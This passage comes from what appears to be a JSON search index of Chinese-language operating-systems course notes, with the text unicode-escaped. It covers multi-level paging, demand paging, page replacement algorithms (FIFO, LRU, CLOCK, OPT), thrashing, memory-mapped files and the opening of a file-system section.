\u5c31\u80fd\u8f6c\u6362\u865a\u62df\u5730\u5740\u548c\u7269\u7406\u5730\u5740\u3002\u8fd9\u662f\u56e0\u4e3a Single-level \u5f80\u5f80\u5360\u7528\u592a\u591a\u5185\u5b58\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e 64-bit computer\uff0c\u5047\u5b9a\u6211\u4eec\u8bbe\u7f6e 4KB page size, 4GB physical memory, 4Byte per page table entry\uff0c\u90a3\u4e48 \\(\\text{Page Offset}= \\log_2 4K=12\\ bits\\)\uff0c\u90a3\u4e48 \\(\\text{Virtual Page Number} = 64-12=52\\ bits\\)\uff0c\u4e00\u4e2a entry \u6709 4B\uff0c\u90a3\u4e48\u6574\u4e2a Page Table \u5360\u7528\u5185\u5b58 \\(2^{52}\\times 4= 2^{54}\\ bytes\\)\uff0c\u8fd9\u5df2\u7ecf\u662f\u7269\u7406\u5185\u5b58 4GB\uff08\\(2^{32}\\)\uff09 \u7684\u4e0d\u77e5\u9053\u591a\u5c11\u500d\u4e86\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u4f7f\u7528 Multi-level Paging \u6280\u672f\u3002\u901a\u5e38\uff0c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a Page Table \u7684\u5927\u5c0f\u7b49\u540c\u4e8e\u4e00\u4e2a Page \u7684\u5927\u5c0f\uff0c\u5bf9\u4e8e\u8be5\u4f8b\u5373\u4e3a 4KB\u3002\u6b64\u65f6\u4e00\u4e2a Page Table \u5171\u6709 4KB / 4B = 1024 \u4e2a entries\u3002</p> <p>1024 \u4e2a entries \u610f\u5473\u7740\u6211\u4eec\u53ea\u9700\u8981 10-bit \u5c31\u80fd\u5bf9\u4e00\u4e2a Page Table \u8fdb\u884c\u7d22\u5f15\uff0c\u90a3\u4e48\u5c42\u6570\u8ba1\u7b97\u5219\u4e3a \\(\\#\\text{ of Level}= \\frac{52}{10}\\ \\text{ceiled is } 6\\)\uff0c\u5373\u5171\u9700\u8981 6 \u5c42\uff0c\u5176\u7d22\u5f15\u7ed3\u6784\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <p></p> <p>Key Points</p> <ul> <li>\u6240\u6709 Page Table \u7684 entry size \u5747\u9700\u76f8\u540c</li> <li>Page Table \u7531\u5185\u5230\u5916\u5206\u522b\u79f0\u4e3a<ul> <li>Page Table, PT</li> <li>Page Directory, PD</li> <li>Page Directory Pointer Table, PDPT</li> </ul> </li> </ul> \ud83c\udf1f \u7c7b\u522b \ud83d\udfe2 \u4f18\u70b9 (Pros) \ud83d\udd34 \u7f3a\u70b9 (Cons) \u5185\u5b58\u5360\u7528 \u4ec5\u4e3a\u5b9e\u9645\u4f7f\u7528\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5206\u914d\u9875\u8868\uff0c\u8282\u7701\u5927\u91cf\u5185\u5b58 \u9875\u8868\u7ed3\u6784\u672c\u8eab\u66f4\u590d\u6742\uff0c\u9700\u8981\u989d\u5916\u7684\u76ee\u5f55\u9875\u8868\uff0c\u5360\u7528\u5c11\u91cf\u989d\u5916\u7a7a\u95f4 \u7a00\u758f\u5730\u5740\u7a7a\u95f4\u652f\u6301 \u5bf9\u4e8e\u7a00\u758f\u5185\u5b58\u4f7f\u7528\u7684\u8fdb\u7a0b\u975e\u5e38\u9ad8\u6548\uff0c\u4e0d\u4f1a\u4e3a\u7a7a\u6d1e\u5730\u5740\u8303\u56f4\u6d6a\u8d39\u9875\u8868\u9879 \u82e5\u8fdb\u7a0b\u4f7f\u7528\u5730\u5740\u7a7a\u95f4\u975e\u5e38\u5bc6\u96c6\uff0c\u591a\u7ea7\u9875\u8868\u8282\u7701\u7684\u7a7a\u95f4\u4f18\u52bf\u4e0d\u660e\u663e \u53ef\u6269\u5c55\u6027 \u9002\u7528\u4e8e\u5927\u578b\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff08\u5982 32 \u4f4d\u300164 \u4f4d\u7cfb\u7edf\uff09 \u968f\u5c42\u6570\u589e\u52a0\uff0c\u9875\u8868\u67e5\u627e\u8fc7\u7a0b\u66f4\u957f\u3001\u66f4\u6162 \u8bbf\u95ee\u901f\u5ea6 \u2014\u2014 \u6bcf\u589e\u52a0\u4e00\u7ea7\u9875\u8868\uff0c\u5c31\u9700\u8981\u591a\u4e00\u6b21\u5185\u5b58\u8bbf\u95ee\u624d\u80fd\u5b8c\u6210\u5730\u5740\u8f6c\u6362 \u6027\u80fd\u4f18\u5316 \u53ef\u4e0e TLB\uff08Translation Lookaside Buffer\uff09 \u914d\u5408\u4f7f\u7528\uff0c\u663e\u8457\u51cf\u5c11\u67e5\u627e\u5ef6\u8fdf \u82e5 TLB \u547d\u4e2d\u7387\u4f4e\uff0c\u4f1a\u51fa\u73b0\u660e\u663e\u6027\u80fd\u4e0b\u964d <p>Paging \u4e3a OS \u63d0\u4f9b\u4e86\u5c06\u865a\u62df\u5730\u5740\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740\uff08Relocation\uff09\u7684\u62bd\u8c61\u5c42\uff0c\u56e0\u6b64\u4e0d\u540c\u5e94\u7528\u53ef\u4ee5\u4f7f\u7528\u5404\u81ea\u9694\u79bb\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff08Protection\uff09\uff0c\u591a\u4e2a\u5e94\u7528\u8fd8\u53ef\u4ee5\u901a\u8fc7 Shared Mapping \u5171\u4eab\u540c\u4e00\u4e2a\u7269\u7406\u9875\uff08Sharing\uff09\u3002</p>"},{"location":"Courses/OS/Topic4/#virtual-memory","title":"Virtual Memory","text":""},{"location":"Courses/OS/Topic4/#demand-paging","title":"Demand Paging","text":"<p>\u57fa\u4e8e\u5c40\u90e8\u6027\u539f\u7406\uff0c\u5728\u7a0b\u5e8f\u88c5\u5165\u65f6\uff0c\u4ec5\u9700\u5c06\u7a0b\u5e8f\u5f53\u524d\u8fd0\u884c\u6240\u9700\u7684\u5c11\u6570 Page \u88c5\u5165\u5185\u5b58\uff0c\u800c\u5c06\u5176\u4f59\u90e8\u5206\u6682\u7559\u5728\u5916\u6751\uff0c\u4fbf\u53ef\u542f\u52a8\u7a0b\u5e8f\u6267\u884c\u3002\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u6240\u8bbf\u95ee\u7684\u4fe1\u606f\u4e0d\u5728\u5185\u5b58\u65f6\uff0c\u7531\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u5c06\u6240\u9700\u4fe1\u606f\u4ece\u5916\u5b58\u4e2d\u8c03\u5165\u5185\u5b58\uff0c\u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a Demand Paging\u3002</p> <p>\u901a\u8fc7 Demand Paging\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5c31\u597d\u50cf\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6bd4\u5b9e\u9645\u5185\u5b58\u5bb9\u91cf\u5927\u5f97\u591a\u7684\u5b58\u50a8\u5668\uff0c\u8fd9\u5c31\u662f Virtual Memory\u3002</p> <p>\u76f8\u6bd4\u4e8e\u57fa\u672c\u5206\u9875\u7cfb\u7edf\uff0c\u8bf7\u6c42\u5206\u9875\u7cfb\u7edf\u9700\u8981\u77e5\u9053\u6bcf\u4e2a Page \u662f\u5426\u5df2\u8c03\u5165\u5185\u5b58\uff1b\u82e5\u672a\u8c03\u5165\uff0c\u8fd8\u9700\u8981\u77e5\u9053\u8be5\u9875\u5728\u5916\u5b58\u4e2d\u7684\u5b58\u653e\u5730\u5740\u3002\u4e3a\u4e86\u5b9e\u73b0\u9875\u9762\u7f6e\u6362\u529f\u80fd\uff0c\u64cd\u4f5c\u7cfb\u7edf\u8fd8\u9700\u8981\u4e00\u4e9b\u989d\u5916\u4fe1\u606f\u548c\u7b97\u6cd5\u6765\u51b3\u5b9a\u6362\u51fa\u54ea\u4e2a\u9875\u9762\uff0c\u4ee5\u53ca\u88ab\u6362\u51fa\u7684\u9875\u9762\u662f\u5426\u88ab\u4fee\u6539\u8fc7\u3002</p> <p>\u56e0\u6b64\uff0c\u4e00\u4e2a Page Entry \u81f3\u5c11\u5305\u542b\u5982\u4e0b\u51e0\u4e2a\u5b57\u6bb5\uff1a</p> <p></p> <p>\u5728\u8bf7\u6c42\u5206\u9875\u7cfb\u7edf\u4e2d\uff0c\u6bcf\u5f53\u8981\u8bbf\u95ee\u7684\u9875\u9762\u4e0d\u5728\u5185\u5b58\u4e2d\u65f6\uff0c\u4fbf\u4f1a\u4ea7\u751f\u4e00\u4e2a Page Fault\uff0c\u5176\u5904\u7406\u6d41\u7a0b\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; \u68c0\u67e5 PCB \u5224\u65ad\u8bbf\u95ee\u662f\u5426\u5408\u6cd5<ul> <li>\u5982\u679c\u8bbf\u95ee\u5730\u5740\u4e0d\u5c5e\u4e8e\u8be5\u8fdb\u7a0b\uff0c\u5219\u4e3a\u975e\u6cd5\u8bbf\u95ee\uff0c\u7ec8\u6b62\u8fdb\u7a0b</li> </ul> </li> <li>&lt;2&gt; \u5982\u679c\u8bbf\u95ee\u5408\u6cd5\uff0c\u4f46 Page \u4e0d\u518d\u5185\u5b58\uff0c\u4ea7\u751f Page Fault \u5e76\u51c6\u5907\u8c03\u5165</li> <li>&lt;3&gt; \u901a\u8fc7\u4e00\u5b9a\u7b97\u6cd5\u9009\u62e9\u4e00\u4e2a\u7a7a\u95f2 Frame</li> <li>&lt;4&gt; \u4ece\u5916\u5b58\u4e2d\u5c06\u6240\u9700\u9875\u9762\u8bfb\u5165\u8be5 Frame</li> <li>&lt;5&gt; \u66f4\u65b0 Page Table Entry \u548c PCB</li> <li>&lt;6&gt; \u91cd\u65b0\u6267\u884c\u521a\u521a\u56e0 Page Fault \u800c\u4e2d\u65ad\u7684\u6307\u4ee4</li> </ul> <p>\u4e00\u6761\u6307\u4ee4\u5728\u6267\u884c\u671f\u95f4\u53ef\u80fd\u4ea7\u751f\u591a\u6b21\u7f3a\u9875\u4e2d\u65ad</p>"},{"location":"Courses/OS/Topic4/#frame-allocation","title":"Frame Allocation","text":"<p>\u5c06\u6709\u9650\u7684\u7269\u7406 Frames \u5206\u914d\u7ed9\u6240\u6709\u8fdb\u7a0b\uff0c\u53ef\u91c7\u7528\u4ee5\u4e0b\u51e0\u79cd\u7b97\u6cd5\uff1a</p> <ul> <li>1\uff09\u5e73\u5747\u5206\u914d\u7b97\u6cd5\uff0c\u5c06\u7cfb\u7edf\u4e2d\u6240\u6709\u53ef\u4f9b\u5206\u914d\u7684\u7269\u7406\u5757\u5e73\u5747\u5206\u914d\u7ed9\u5404\u4e2a\u8fdb\u7a0b\u3002</li> <li>2\uff09\u6309\u6bd4\u4f8b\u5206\u914d\u7b97\u6cd5\uff0c\u6839\u636e\u8fdb\u7a0b\u7684\u5927\u5c0f\u6309\u6bd4\u4f8b\u5206\u914d\u7269\u7406\u5757\u3002</li> <li>3\uff09\u4f18\u5148\u6743\u5206\u914d\u7b97\u6cd5\uff0c\u4e3a\u91cd\u8981\u548c\u7d27\u8feb\u7684\u8fdb\u7a0b\u5206\u914d\u8f83\u591a\u7684\u7269\u7406\u5757\u3002\u901a\u5e38\u91c7\u53d6\u7684\u65b9\u6cd5\u662f\u5c06\u6240\u6709\u53ef\u5206\u914d\u7684\u7269\u7406\u5757\u5206\u6210\u4e24\u90e8\u5206\uff1a\u4e00\u90e8\u5206\u6309\u6bd4\u4f8b\u5206\u914d\u7ed9\u5404\u4e2a\u8fdb\u7a0b\uff1b\u4e00\u90e8\u5206\u5219\u6839\u636e\u4f18\u5148\u6743\u5206\u914d\u3002</li> </ul>"},{"location":"Courses/OS/Topic4/#page-replacement","title":"Page Replacement","text":"<p>\u8fdb\u7a0b\u8fd0\u884c\u65f6\uff0c\u82e5\u5185\u5b58\u5df2\u65e0\u7a7a\u95f2\u7a7a\u95f4\u65f6\u4f46\u9700\u8981\u8c03\u5165\u4e00\u4e2a Page \u65f6\uff0c\u5c31\u9700\u8981\u901a\u8fc7\u9875\u9762\u7f6e\u6362\u7b97\u6cd5\u4ece\u5185\u5b58\u4e2d\u8c03\u51fa\u4e00\u4e2a Page\u3002</p> <p>\u7531\u4e8e Page \u7684 swap in \u548c swap out \u9700\u8981\u78c1\u76d8 I/O\uff0c\u5f00\u9500\u8f83\u5927\uff0c\u56e0\u6b64\u4e00\u4e2a\u597d\u7684\u7f6e\u6362\u7b97\u6cd5\u5e94\u8be5\u8ffd\u6c42\u66f4\u4f4e\u7684\u7f3a\u9875\u7387</p> <p>FIFO</p> <p>FIFO \u7b97\u6cd5\u4f18\u5148\u66ff\u6362\u6700\u65e9\u8fdb\u5165\u5185\u5b58\u7684\u9875\u9762\u3002\u8be5\u7b97\u6cd5\u5b9e\u73b0\u7b80\u5355\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5229\u7528\u5c40\u90e8\u6027\u539f\u7406\uff0c\u4e0e\u5b9e\u9645\u8fd0\u884c\u89c4\u5f8b\u4e0d\u9002\u5e94\uff0c\u56e0\u6b64\u6027\u80fd\u8f83\u5dee\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0cFIFO \u7b97\u6cd5\u8fd8\u6709\u53ef\u80fd\u56e0\u4e3a\u7cfb\u7edf\u4e3a\u8be5\u8fdb\u7a0b\u5206\u914d\u7684\u7269\u7406\u5757\u589e\u591a\u800c\u51fa\u73b0 Page Fault \u6b21\u6570\u4e0d\u51cf\u53cd\u589e\u7684\u5f02\u5e38\u73b0\u8c61\uff0c\u8fd9\u88ab\u79f0\u4e3a Belady \u5f02\u5e38\u3002</p> <p>\u53ea\u6709 FIFO \u4f1a\u51fa\u73b0 Belady \u5f02\u5e38</p> <p>LRU</p> <p>LRU \u7b97\u6cd5\u4f18\u5148\u66ff\u6362\u6700\u8fd1\u6700\u957f\u65f6\u95f4\u672a\u4f7f\u7528\u7684\u9875\u9762\uff0c\u8be5\u7b97\u6cd5\u4e3a\u6bcf\u4e2a Page \u7ef4\u62a4\u4e00\u4e2a\u4e0a\u6b21\u8bbf\u95ee\u7684\u65f6\u95f4\u6233\uff0c\u5e76\u6dd8\u6c70\u73b0\u6709\u9875\u9762\u4e2d\u503c\u6700\u5927\u7684 Page\u3002</p> <p>\u6839\u636e\u5c40\u90e8\u6027\u539f\u7406\uff0cLRU \u7b97\u6cd5\u7684\u6027\u80fd\u8f83\u597d\uff0c\u4f46\u5b9e\u73b0\u8d77\u6765\u9700\u8981\u5bc4\u5b58\u5668\u548c\u6808\u7684\u786c\u4ef6\u652f\u6301\u3002</p> <p>\u53e6\u5916\uff0c\u5728\u6570\u636e\u5e93\u626b\u63cf\u573a\u666f\u4e0b\uff0cLRU \u7684\u6027\u80fd\u6709\u53ef\u80fd\u6bd4\u4e0d\u8fc7 MRU</p> <p>CLOCK</p> <p>CLOCK \u7b97\u6cd5\u53ca\u5176\u53d8\u4f53\u5c1d\u8bd5\u7528\u66f4\u5c0f\u7684\u5f00\u9500\u6765\u63a5\u8fd1 LRU \u7b97\u6cd5\u7684\u6027\u80fd\uff0c\u5b83\u4e5f\u88ab\u79f0\u4e3a Second-Chance \u7f6e\u6362\u7b97\u6cd5\u3002</p> <p>\u6700\u7b80\u5355\u7684 CLOCK \u7f6e\u6362\u7b97\u6cd5\u5c06\u5185\u5b58\u4e2d\u7684 Page \u94fe\u63a5\u6210\u5faa\u73af\u961f\u5217\uff0c\u5f53 Page \u9996\u6b21\u88c5\u5165\u6216\u88ab\u8bbf\u95ee\u65f6\uff0c\u5176 Reference Bit \u7f6e 1\u3002\u5f53\u9700\u8981\u66ff\u6362\u4e00\u4e2a Page \u65f6\uff0c\u4e00\u4e2a\u66ff\u6362\u6307\u9488\u4f1a\u987a\u5e8f\u68c0\u67e5\u5faa\u73af\u961f\u5217\u4e2d\u7684 Page\uff0c\u5982\u679c\u9047\u5230 Ref = 0 \u7684 Page\uff0c\u5219\u5c06\u5176\u66ff\u6362\uff1b\u5982\u679c\u9047\u5230 Ref = 1 \u7684 Page\uff0c\u5219\u5c06\u5176\u7f6e 0\uff0c\u7ed9\u4e88\u7b2c\u4e8c\u6b21\u9a7b\u7559\u5185\u5b58\u7684\u673a\u4f1a\u3002</p> <p>\u6539\u8fdb\u7684 CLOCK \u7b97\u6cd5\u4f7f\u7528\u8bbf\u95ee\u4f4d A \u548c\u4fee\u6539\u4f4d M \u4e00\u8d77\u4f5c\u4e3a\u66ff\u6362\u7684\u4f9d\u636e\uff0c\u6839\u636e\u4e8c\u8005\u7ec4\u5408\uff0c\u603b\u5171\u6709\u5982\u4e0b\u56db\u79cd\u7c7b\u578b\u7684 Page\uff1a</p> <ul> <li>\\(A=0, M=0\\): \u6700\u8fd1\u672a\u88ab\u8bbf\u95ee\uff0c\u4e14\u672a\u88ab\u4fee\u6539\uff0c\u662f\u6700\u4f73\u7684\u6dd8\u6c70\u9875</li> <li>\\(A=0, M=1\\): \u6700\u8fd1\u672a\u88ab\u8bbf\u95ee\uff0c\u4f46\u5df2\u88ab\u4fee\u6539\uff0c\u662f\u6b21\u4f73\u7684\u6dd8\u6c70\u9875</li> <li>\\(A=1,M=0\\): \u6700\u8fd1\u5df2\u88ab\u8bbf\u95ee\uff0c\u4f46\u672a\u88ab\u4fee\u6539\uff0c\u53ef\u80fd\u518d\u6b21\u8bbf\u95ee</li> <li>\\(A=1, M=1\\): \u6700\u8fd1\u5df2\u88ab\u8bbf\u95ee\uff0c\u4e14\u5df2\u88ab\u4fee\u6539\uff0c\u53ef\u80fd\u518d\u6b21\u8bbf\u95ee</li> </ul> <p>\u6b64\u65f6\uff0c\u66ff\u6362\u6307\u9488\u626b\u63cf\u603b\u5171\u5206\u4e3a\u4e09\u6b65\uff1a</p> <ul> <li>&lt;1&gt; \u4ece\u6307\u9488\u5f53\u524d\u4f4d\u7f6e\u5f00\u59cb\u626b\u63cf\u4e00\u8f6e\uff0c\u5bfb\u627e \\(A=0, M=0\\) \u7684 Page \u5e76\u9009\u4e2d<ul> <li>\u7b2c\u4e00\u6b21\u626b\u63cf\u671f\u95f4\u4e0d\u6539\u53d8 \\(A\\)</li> <li>\u6709\u53ef\u80fd\u627e\u4e0d\u5230\u7b26\u5408\u8981\u6c42\u7684 Page</li> </ul> </li> <li>&lt;2&gt; \u82e5\u7b2c\u4e00\u6b65\u5931\u8d25\uff0c\u5f00\u59cb\u7b2c\u4e8c\u8f6e\u626b\u63cf\uff0c\u5bfb\u627e \\(A=0, M=1\\) \u7684 Page \u5e76\u9009\u4e2d\uff1b\u626b\u63cf\u671f\u95f4\uff0c\u5c06\u6240\u6709\u626b\u63cf\u5230\u7684 Page \u7684 \\(A\\) \u7f6e 0<ul> <li>\u6b64\u65f6\u4e5f\u6709\u53ef\u80fd\u5931\u8d25\uff0c\u5373\u5b58\u5728\u6240\u6709 Page \u7684 \\(A\\) \u5747\u4e3a 1 \u7684\u60c5\u51b5</li> </ul> </li> <li>&lt;3&gt; \u82e5\u7b2c\u4e8c\u6b65\u4e5f\u5931\u8d25\uff0c\u5219\u91cd\u590d &lt;1&gt; \u548c &lt;2&gt;\uff0c\u6b64\u65f6\u4e00\u5b9a\u80fd\u627e\u5230\u88ab\u6dd8\u6c70\u7684 Page</li> </ul> <p>\u6539\u8fdb CLOCK \u7b97\u6cd5\u51cf\u5c11\u4e86\u78c1\u76d8 I/O \u6b21\u6570\uff0c\u4f46\u7b97\u6cd5\u672c\u8eab\u5f00\u9500\u589e\u5927</p> <p>Optimal</p> <p>OPT \u7f6e\u6362\u7b97\u6cd5\u9009\u62e9\u6dd8\u6c70\u4ee5\u540e\u6c38\u4e0d\u4f7f\u7528\u6216\u6700\u957f\u65f6\u95f4\u5185\u4e0d\u4f1a\u518d\u88ab\u8bbf\u95ee\u7684 Page\uff0c\u4fdd\u8bc1\u83b7\u5f97\u6700\u4f4e\u7684\u7f3a\u9875\u7387\u3002\u7136\u540e\uff0c\u8fdb\u7a0b\u4e2d\u54ea\u4e2a\u9875\u9762\u662f\u672a\u6765\u6700\u957f\u65f6\u95f4\u5185\u4e0d\u4f1a\u88ab\u8bbf\u95ee\u7684\u662f\u65e0\u6cd5\u9884\u6d4b\u7684\uff0c\u56e0\u6b64\u8be5\u7b97\u6cd5\u65e0\u6cd5\u5b9e\u73b0\uff0c\u4f46\u53ef\u5229\u7528\u8be5\u7b97\u6cd5\u53bb\u8bc4\u4ef7\u5176\u5b83\u7b97\u6cd5\u3002</p> <p>LRU \u7b97\u6cd5\u662f\u6700\u63a5\u8fd1 OPT \u7b97\u6cd5\u7684\u7f6e\u6362\u7b97\u6cd5\u3002</p>"},{"location":"Courses/OS/Topic4/#thrashing","title":"Thrashing","text":"<p>\u4e00\u4e2a\u8fdb\u7a0b\u5728\u9891\u7e41\u7684\u8fdb\u884c Page \u6362\u51fa\u6362\u8fdb\uff0c\u8fd9\u4e00\u73b0\u8c61\u79f0\u4e3a Thrashing\u3002</p> <p>\u7cfb\u7edf\u53d1\u751f Thrashing \u7684\u6839\u672c\u539f\u56e0\u662f\u5206\u914d\u7ed9\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u7269\u7406\u5757\u592a\u5c11\uff0c\u4e0d\u80fd\u6ee1\u8db3\u8fdb\u7a0b\u6b63\u5e38\u8fd0\u884c\u7684\u57fa\u672c\u8981\u6c42\uff0c\u5bfc\u81f4\u6bcf\u4e2a\u8fdb\u7a0b\u8fd0\u884c\u65f6\u9891\u7e41\u7f3a\u9875\u3002</p> <p>\u4e3a\u6b64\uff0c\u6211\u4eec\u5f15\u5165\u8fdb\u7a0b\u5de5\u4f5c\u96c6(Working Set)\u7684\u6982\u5ff5\u3002\u5de5\u4f5c\u96c6\u662f\u6307\u5728\u67d0\u6bb5\u65f6\u95f4\u95f4\u9694\u5185\uff0c\u8fdb\u7a0b\u8981\u8bbf\u95ee\u7684 Page \u96c6\u5408\u3002\u4e00\u822c\u6765\u8bb2\uff0c\u5de5\u4f5c\u96c6 \\(W\\) \u53ef\u901a\u8fc7\u65f6\u95f4 \\(t\\) \u548c\u5de5\u4f5c\u96c6\u7a97\u53e3\u5c3a\u5bf8 \\(\\Delta\\) \u6765\u786e\u5b9a\uff1a</p> <p></p> <p>\u4f8b\u5982\u5bf9\u4e8e\u5982\u4e0a\u4f8b\u5b50\uff0c\u7a97\u53e3\u5c3a\u5bf8 \\(\\Delta=5\\)\uff0c\u5728 \\(t_1\\) \u65f6\u523b\uff0c\u5de5\u4f5c\u96c6\u4e3a \\(\\{2,3,5\\}\\)\uff0c\\(t_2\\) \u65f6\u523b\uff0c\u5de5\u4f5c\u96c6\u4e3a \\(\\{1,2,3,4\\}\\)\u3002</p> <p>\u5de5\u4f5c\u96c6\u53cd\u6620\u4e86\u8fdb\u7a0b\u5728\u63a5\u4e0b\u6765\u7684\u4e00\u6bb5\u65f6\u95f4\u5185\u53ef\u80fd\u9891\u7e41\u8bbf\u95ee\u7684 Page \u96c6\u5408\uff0c\u56e0\u6b64\u8be5\u8fdb\u7a0b\u88ab\u5206\u914d\u7684\u7269\u7406\u5757\u4e2a\u6570\u4e0d\u80fd\u5c0f\u4e8e\u5de5\u4f5c\u96c6\u5927\u5c0f\uff0c\u5426\u5219\u4f1a\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u9891\u7e41\u7f3a\u9875\u3002</p>"},{"location":"Courses/OS/Topic4/#memory-mapped-files","title":"Memory-Mapped Files","text":"<p>\u5185\u5b58\u6620\u5c04\u6587\u4ef6\u662f\u64cd\u4f5c\u7cfb\u7edf\u5411\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u4e0e\u865a\u62df\u5185\u5b58\u6709\u4e9b\u76f8\u4f3c\uff0c\u4f1a\u5728\u78c1\u76d8\u6587\u4ef6\u548c\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e4b\u95f4\u5efa\u7acb\u6620\u5c04\u5173\u7cfb\u3002</p> <p>Memory-Mapped File I/O \u7684\u6838\u5fc3\u601d\u60f3\u662f\uff0c\u628a\u78c1\u76d8\u4e0a\u7684\u6587\u4ef6\u5185\u5bb9\u6620\u5c04\u5230\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u4e2d\uff0c\u4f7f\u6587\u4ef6\u8bbf\u95ee\u53d8\u6210\u666e\u901a\u7684\u5185\u5b58\u8bbf\u95ee\uff0c\u5373\u4ece read/write \u53d8\u4e3a load/store\u3002</p> <p>\u78c1\u76d8\u6587\u4ef6\u7684\u8bfb\u5199\u7531\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u5b8c\u6210\uff0c\u5bf9\u8fdb\u7a0b\u800c\u8a00\u662f\u900f\u660e\u7684\u3002\u5728\u6620\u5c04\u8fdb\u7a0b\u7684\u9875\u9762\u65f6\uff0c\u4e0d\u4f1a\u5b9e\u9645\u8bfb\u5165\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u800c\u53ea\u5728\u8bbf\u95ee\u9875\u9762\u65f6\u624d\u88ab\u6bcf\u6b21\u4e00\u9875\u5730\u8bfb\u5165\u3002\u5f53\u8fdb\u7a0b\u9000\u51fa\u6216\u5173\u95ed\u6587\u4ef6\u6620\u5c04\u65f6\uff0c\u6240\u6709\u88ab\u6539\u52a8\u7684\u9875\u9762\u624d\u88ab\u5199\u56de\u78c1\u76d8\u6587\u4ef6\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5171\u4eab\u5185\u5b58\u7684\u65b9\u5f0f\u5c31\u662f\u901a\u8fc7 Memory-Mapped Files \u5b9e\u73b0\u7684\uff0c\u5b83\u5c06\u540c\u4e00\u4efd\u6587\u4ef6\u6620\u5c04\u5230\u4e24\u4e2a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff1a</p> <p></p>"},{"location":"Courses/OS/Topic5/","title":"File System","text":""},{"location":"Courses/OS/Topic5/#file-system","title":"File System","text":"<p> \u7ea6 1420 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Courses/OS/Topic5/#file-basic","title":"File Basic","text":"<p>File \u662f\u5305\u542b\u5206\u7c7b\u548c\u7d22\u5f15\u4fe1\u606f\u3001\u8bbf\u95ee\u6743\u9650\u7684\u4fe1\u606f\u7684\u5b58\u50a8\u7a7a\u95f4\u4e2d\u7684\u6570\u636e\u3002\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e0e\u4e8c\u7ea7\u5b58\u50a8\u76f8\u5173\u8d44\u6e90\u7684\u62bd\u8c61\uff0c\u80fd\u591f\u8ba9\u7528\u6237\u5728\u4e0d\u4e86\u89e3\u6587\u4ef6\u7684\u5404\u79cd\u5c5e\u6027\u3001\u6587\u4ef6\u5b58\u50a8\u4ecb\u8d28\u7684\u7279\u5f81\u4ee5\u53ca\u6587\u4ef6\u5728\u5b58\u50a8\u4ecb\u8d28\u4e0a\u7684\u5177\u4f53\u4f4d\u7f6e\u7b49\u60c5\u51b5\u4e0b\uff0c\u65b9\u4fbf\u5feb\u6377\u5730\u4f7f\u7528\u6587\u4ef6\u3002</p> <p>\u9664\u4e86\u6587\u4ef6\u672c\u8eab\u6570\u636e\u5916\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u4f1a\u4fdd\u5b58\u5982\u4e0b\u4e0e\u6587\u4ef6\u76f8\u5173\u7684\u5c5e\u6027\uff1a</p> <ul> <li>Name: unique\uff0c\u4ee5\u5bb9\u6613\u8bfb\u53d6\u7684\u5f62\u5f0f\u4fdd\u5b58</li> <li>Type: \u88ab\u652f\u6301\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u4ef6\u7cfb\u7edf\u6240\u4f7f\u7528</li> <li>Creater: \u6587\u4ef6\u521b\u5efa\u8005\u7684 ID</li> <li>Owner: \u6587\u4ef6\u5f53\u524d\u6240\u6709\u8005\u7684 ID</li> <li>Location: \u6307\u5411\u8bbe\u5907\u4e0a\u6587\u4ef6\u7684\u6307\u9488</li> <li>Size: \u6587\u4ef6\u5f53\u524d\u5927\u5c0f\uff0c\u4e5f\u53ef\u5305\u542b\u6587\u4ef6\u5141\u8bb8\u7684\u6700\u5927\u503c</li> <li>Protection: \u6587\u4ef6\u8bbf\u95ee\u63a7\u5236\u76f8\u5173\u4fe1\u606f</li> <li>Time: \u5305\u542b\u6587\u4ef6\u521b\u5efa\u3001\u4e0a\u6b21\u4fee\u6539\u3001\u4e0a\u6b21\u8bbf\u95ee\u7684\u65f6\u95f4\uff0c\u7528\u4e8e\u4fdd\u62a4\u548c\u8ddf\u8e2a\u6587\u4ef6\u7684\u4f7f\u7528</li> </ul> <p>\u6587\u4ef6\u5c5e\u4e8e\u62bd\u8c61\u6570\u636e\u7c7b\u578b\uff0c\u6211\u4eec\u9700\u8981\u8003\u8651\u53ef\u4ee5\u5bf9\u6587\u4ef6\u6267\u884c\u7684\u64cd\u4f5c\u3002OS \u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u6587\u4ef6\u76f8\u5173\u7684 Syscall\uff1a</p> <ul> <li>Create<ul> <li> <ol> <li>\u4e3a\u65b0\u6587\u4ef6\u5206\u914d Memory \u7a7a\u95f4</li> </ol> </li> <li> <ol> <li>\u5728 Directory \u4e2d\u4e3a\u5176\u521b\u5efa\u4e00\u4e2a D 